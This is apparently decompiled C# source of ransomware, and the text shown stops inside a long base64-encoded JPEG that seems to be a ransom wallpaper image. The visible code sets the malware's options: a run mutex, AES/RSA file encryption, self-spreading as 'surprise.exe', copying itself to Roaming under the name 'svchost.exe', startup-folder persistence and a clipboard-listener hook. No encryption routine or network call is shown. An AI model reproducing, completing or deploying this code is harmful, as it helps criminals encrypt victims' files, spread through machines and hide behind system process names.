using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEBLAEsAAD/4QBWRXhpZgAATU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAAAAAEsAAAAAQAAASwAAAAB/+0ALFBob3Rvc2hvcCAzLjAAOEJJTQQEAAAAAAAPHAFaAAMbJUccAQAAAgAEAP/hDW5odHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0n77u/JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0nYWRvYmU6bnM6bWV0YS8nIHg6eG1wdGs9J0ltYWdlOjpFeGlmVG9vbCAxMS44OCc+CjxyZGY6UkRGIHhtbG5zOnJkZj0naHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyc+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczp0aWZmPSdodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyc+CiAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICA8dGlmZjpYUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpYUmVzb2x1dGlvbj4KICA8dGlmZjpZUmVzb2x1dGlvbj4zMDAvMTwvdGlmZjpZUmVzb2x1dGlvbj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6eG1wPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvJz4KICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIFN0b2NrIFBsYXRmb3JtPC94bXA6Q3JlYXRvclRvb2w+CiA8L3JkZjpEZXNjcmlwdGlvbj4KCiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogIHhtbG5zOnhtcE1NPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vJz4KICA8eG1wTU06RG9jdW1lbnRJRD54bXAuaWlkOmE5NDE0MWRkLWQyNDEtNDFlNy1iZGRjLWJmOTIzNzQwMDYxMzwveG1wTU06RG9jdW1lbnRJRD4KICA8eG1wTU06SW5zdGFuY2VJRD5hZG9iZTpkb2NpZDpzdG9jazozZDdkYTE3NS0zOWViLTQ0MjAtYTExNi0xNjYyZjI5YjNiZmI8L3htcE1NOkluc3RhbmNlSUQ+CiAgPHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD5hZG9iZTpkb2NpZDpzdG9jazo3MTU2NzY3NjU8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KIDwvcmRmOkRlc2NyaXB0aW9uPgo8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSd3Jz8+/9sAQwAF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